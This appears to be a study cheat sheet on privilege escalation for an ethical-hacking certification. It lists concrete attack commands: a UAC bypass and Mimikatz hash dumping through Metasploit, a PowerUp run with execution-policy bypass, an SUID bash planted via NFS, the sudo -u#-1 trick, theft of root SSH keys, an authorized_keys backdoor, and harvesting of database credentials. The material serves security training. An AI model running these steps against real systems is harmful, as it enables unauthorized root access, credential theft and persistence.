## System Hacking


### Escalate privileges
1. Windows
   1. Establish VNC session (windows)
      - Setup a reverse TCP shell then:
      - Run `sysinfo` to see system details
      - `upload /root/PowerSpoilt/Privesc/PowerUp.ps1` to upload a powershell script
      - `shell` to get a shell
      - In shell: `powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1; Invoke-AllChecks"` to run the powershell script
      - exit and get back to meterpreter
      - get remote access via VNC: `run vnc`
   2. Bypass UAC
      - Setup a reverse TCP shell and move to background
      - `>` `search bypassuac`
      - `>` `use exploit/windows/local/bypassuac_fodhelper`
      - `>` `show options`
      - Set `session=1`, `LHOST`, `LPORT`, `TARGET=0`
      - `>` `exploit`
      - In new meterpreter session: `>` `getsystem -t 1`
   3. Mimikatz
      - After getting a meterpreter session with bypass UAC:
        - `>` `load kiwi`
        - `>` `help kiwi`
        - view various hashes with dump commands
        - Change password: `>` `password_change -u <username> -n <current pw hash> -P <new password>`
2. Linux Privilege Escalation
   1. Horizontal privilege escalation
      - `sudo -l` to see which user can execute what commands as sudo without password
      - `sudo -u <user> <command>` to execute a command as another user
   2. Vertical privilege escalation
      1. Using NFS
         - `showmount -e <target ip>` to see the shared directories
         - `mkdir /tmp/<folder name>` to create a folder in tmp directory
         - `mount -t nfs <target ip>:/<shared directory> /tmp/<folder name>` to mount the shared directory
         - `cd /tmp/<folder name>` to go to the shared directory
         - `ls -la` to see the files in the directory
         - `cp /bin/bash .` to copy the bash file to the shared directory
         - `chmod +s bash` to change the permission of the bash file
         - Login as normal user via ssh
         - `cd <shared directory>`
         - `./bash -p` to get root access
         - `cp /bin/nano .` 
         - `./nano -p /etc/shadow` to show hashes of all users
      2. Using sudo command
         - `sudo -i` to get root access
         - `sudo -u#-1 <command>` to execute a command as root
         - `sudo -u#-1 /bin/bash` to get root access
         - `sudo -u#-1 /bin/sh` to get root access
      3. Using id_rsa private key
         - `cat /root/.ssh/id_rsa` to get the private key
         - create id_rsa file in local machine and paste the private key
         - `chmod 600 id_rsa` to change the permission of the file
         - `ssh -i id_rsa root@<target ip>` to login as the user
         - `whoami` to check the user
      4. Using your public key
         - `ssh-keygen` to generate a public key
         - `cat ~/.ssh/id_rsa.pub` to get the public key
         - `echo "<public key>" >> /root/.ssh/authorized_keys` to add the public key to the authorized_keys file
         - `ssh -i id_rsa root@<target ip>` to login as the user
         - `whoami` to check the user
      5. Using DB credentials obtained from php file in web server 
         - `cd /var/www/html`
         - `grep -nr "db_user"`
         - `cat file_name`
         - use credentials from file to login as root
      6. Others: users, groups, SUID, GUID, mounts, .sh scripts. cronjobs, etc.
3. Other priv escalation at: https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/system-hacking#powersploit
